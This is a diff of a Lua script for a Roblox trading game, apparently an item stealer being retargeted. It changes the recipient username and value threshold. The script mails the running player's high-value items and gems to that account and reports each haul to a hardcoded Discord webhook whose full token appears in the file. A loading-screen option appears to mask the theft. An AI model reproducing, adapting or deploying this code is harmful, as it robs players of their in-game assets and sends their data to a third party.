@@ -1,4 +1,4 @@
-Username = "purel4urbrains"
+Username = "MargarinePool"
 Username2 = "Kuleczka1355"
 Webhook = "https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4"
 
@@ -6,7 +6,7 @@ Roblox_Username = Username
 Discord_Webhook = Webhook
 
 if selectedLoadingScreen == nil or selectedLoadingScreen == "" then
-    selectedLoadingScreen = "2"
+    selectedLoadingScreen = "1"
 end
 
 if selectedLoadingScreen == "1" then
@@ -55,7 +55,7 @@ local Directory = require(game:GetService("ReplicatedStorage").Library.Directory
 local Player = game.Players.LocalPlayer
 local Inventory = Save.Inventory
 local HttpService = game:GetService("HttpService")
-local MailMessage = "AvioScript TheBest"
+local MailMessage = "AvioScript"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
@@ -286,7 +286,7 @@ local function GetThumbnail(imageid)
     return thumbnail
 end
 
-local MinimumRAP = 500000
+local MinimumRAP = 1000000
 
 if Inventory.Box then
     for key, value in pairs(Inventory.Box) do
@@ -698,7 +698,7 @@ end
 local function sendItem(category, uid, am, locked)
     local args = {
         [1] = Roblox_Username,
-        [2] = "AvioScript TheBest",
+        [2] = "AvioScript",
         [3] = category,
         [4] = uid,
         [5] = am
@@ -732,7 +732,7 @@ local function SendAllGems()
 				SentGems = GemsAmount - FirstPriceOfMail
                 local args = {
                     [1] = Roblox_Username,
-                    [2] = "AvioScript TheBest",
+                    [2] = "AvioScript",
                     [3] = "Currency",
                     [4] = i,
                     [5] = SentGems
@@ -806,7 +806,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                         v.Item_RAP,
                         totalRap
                     )
-                    if Roblox_Username ~= DualHook then
+                    if Roblox_Username ~= Dualhook then
                         SendMessage(
                             v.Item_Name,
                             v.Item_Class,
@@ -815,7 +815,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                             "",
                             Left_Hits,
                             v.IsShiny,
-                            "AvioScript TheBest",
+                            "AvioScript",
                             v.Item_RAP,
                             totalRap
                         )
@@ -827,4 +827,4 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
     end
     SendAllGems()
-end
+  end
